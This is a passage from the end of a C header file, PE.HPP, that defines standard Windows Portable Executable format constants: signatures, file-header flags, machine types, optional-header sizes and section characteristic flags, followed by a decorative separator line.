short    fx_typeoffs[];          // 08 09 .. ..
} PE_FIXUP;

#pragma pack(pop)

#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_OS2_SIGNATURE 0x454E
#define IMAGE_OS2_SIGNATURE_LE 0x454C
#define IMAGE_VXD_SIGNATURE 0x454C
#define IMAGE_NT_SIGNATURE 0x4550
#define IMAGE_SIZEOF_FILE_HEADER 20
#define IMAGE_FILE_RELOCS_STRIPPED 1
#define IMAGE_FILE_EXECUTABLE_IMAGE 2
#define IMAGE_FILE_LINE_NUMS_STRIPPED 4
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 8
#define IMAGE_FILE_BYTES_REVERSED_LO 128
#define IMAGE_FILE_32BIT_MACHINE 256
#define IMAGE_FILE_DEBUG_STRIPPED 512
#define IMAGE_FILE_SYSTEM 0x1000
#define IMAGE_FILE_DLL 0x2000
#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000
#define IMAGE_FILE_MACHINE_UNKNOWN 0
#define IMAGE_FILE_MACHINE_I386 0x14c
#define IMAGE_FILE_MACHINE_R3000 0x162
#define IMAGE_FILE_MACHINE_R4000 0x166
#define IMAGE_FILE_MACHINE_R10000 0x168
#define IMAGE_FILE_MACHINE_ALPHA 0x184
#define IMAGE_FILE_MACHINE_POWERPC 0x1F0
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_SIZEOF_ROM_OPTIONAL_HEADER 56
#define IMAGE_SIZEOF_STD_OPTIONAL_HEADER 28
#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER 224
#define IMAGE_NT_OPTIONAL_HDR_MAGIC 0x10b
#define IMAGE_ROM_OPTIONAL_HDR_MAGIC 0x107
#define IMAGE_FIRST_SECTION(nth) ((PIMAGE_SECTION_HEADER) \
 ((DWORD)nth + FIELD_OFFSET( IMAGE_NT_HEADERS,OptionalHeader ) + \
 ((PIMAGE_NT_HEADERS)(nth))->FileHeader.SizeOfOptionalHeader))
#define IMAGE_SCN_TYPE_NO_PAD 8
#define IMAGE_SCN_CNT_CODE 32
#define IMAGE_SCN_CNT_INITIALIZED_DATA 64
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 128
#define IMAGE_SCN_LNK_OTHER 256
#define IMAGE_SCN_LNK_INFO 512
#define IMAGE_SCN_LNK_REMOVE 0x800
#define IMAGE_SCN_LNK_COMDAT 0x1000
#define IMAGE_SCN_MEM_FARDATA 0x8000
#define IMAGE_SCN_MEM_PURGEABLE 0x20000
#define IMAGE_SCN_MEM_16BIT 0x20000
#define IMAGE_SCN_MEM_LOCKED 0x40000
#define IMAGE_SCN_MEM_PRELOAD 0x80000
#define IMAGE_SCN_ALIGN_1BYTES 0x100000
#define IMAGE_SCN_ALIGN_2BYTES 0x200000
#define IMAGE_SCN_ALIGN_4BYTES 0x300000
#define IMAGE_SCN_ALIGN_8BYTES 0x400000
#define IMAGE_SCN_ALIGN_16BYTES 0x500000
#define IMAGE_SCN_ALIGN_32BYTES 0x600000
#define IMAGE_SCN_ALIGN_64BYTES 0x700000
#define IMAGE_SCN_LNK_NRELOC_OVFL 0x1000000
#define IMAGE_SCN_MEM_DISCARDABLE 0x2000000
#define IMAGE_SCN_MEM_NOT_CACHED 0x4000000
#define IMAGE_SCN_MEM_NOT_PAGED 0x8000000
#define IMAGE_SCN_MEM_SHARED 0x10000000
#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define IMAGE_SCN_MEM_READ 0x40000000
#define IMAGE_SCN_MEM_WRITE 0x80000000

#endif // __PE_HPP__

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[PE.HPP]컴�
